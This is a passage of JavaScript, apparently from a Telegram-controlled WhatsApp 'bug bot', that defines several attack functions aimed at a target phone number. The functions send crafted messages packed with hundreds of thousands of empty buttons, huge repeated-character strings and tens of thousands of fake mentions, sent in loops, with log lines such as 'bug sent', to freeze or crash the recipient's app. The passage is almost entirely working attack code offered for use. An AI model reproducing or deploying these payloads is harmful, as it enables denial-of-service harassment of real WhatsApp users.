        await ctx.reply(`⚠️ SENDER RESTRICT! Akun WhatsApp lu kena restrict! Gak bisa add member/join group!`);
        throw new Error(`SENDER RESTRICT: Akun kena restrict!`);
      }
      
      if (e.message.includes("already a participant")) {
        await sleep(1000);
        continue;
      }
      throw e;
    }
  }
}

async function FreezeDelay(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  for (let i = 0; i < 10; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      groupStatusMessageV2: {
        message: {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "\x10"
                },
                nativeFlowMessage: {
                  buttons: [
                    ...Array.from({ length: 500000 }, () => ({}))
                  ]
                }
              }
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id
    });

    await sleep(2000);
  }
}

async function noctradelayhard(sock, target) {
  try {
    console.log("celyn");
    
    for (let i = 0; i < 10; i++) {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            albumMessage: {
              contextInfo: {
                statusAttributionType: 1,
                urlTrackingMap: {
                  "https://example.com": "{".repeat(500000)
                },
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 1950 },
                    () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                  )
                ],
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 60000
                  }
                }
              }
            }
          }
        }
      }, {
        participant: true,
        messageId: null
      });
    }
    
    console.log(`Noctra Delay Hard sent to ${target}`);
    
  } catch (error) {
    console.log(`❌ Error: ${error.message}`);
  }
}

async function ZynosBlank(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

  const msg = await generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {},
          body: {
            text: "p"
          },
          nativeFlowMessage: {
            messageParamsJson: "|{".repeat(10000),
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PLACE",
                  flow_cta: "ꦽ".repeat(15000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(jid, msg.message, {
    participant: true,
    messageId: msg.key.id
  });

  console.log(`bug sent to ${jid}`);
}

async function BuldozerByZynos(sock, target) {

  for (let i = 0; i < 200; i++) {
    const message = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 40000 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    await sock.relayMessage(target, msg.message, {
      participant: true,
      messageId: msg.key.id
    });

    if ((i + 1) % 10 === 0) await sleep(1000);
  }

  console.log(`𝐒𝐞𝐧𝐝𝐢𝐧𝐠 𝐁𝐮𝐠𝐬... ${target}`);
}
///////////////////[FUNC]////////////////
// ============================================
// EKSEKUSI / JALANKAN UTAMA
// ============================================

(async () => {
  console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
  `));

  startSesi();
  
  // Jalankan bot Telegram
  await bot.launch();
  console.log('✅ Bot Telegram siap!');

  // 🔥 AUTO LOAD WORKER SETELAH BOT LAUNCH
  autoLoadAllWorkers();

})();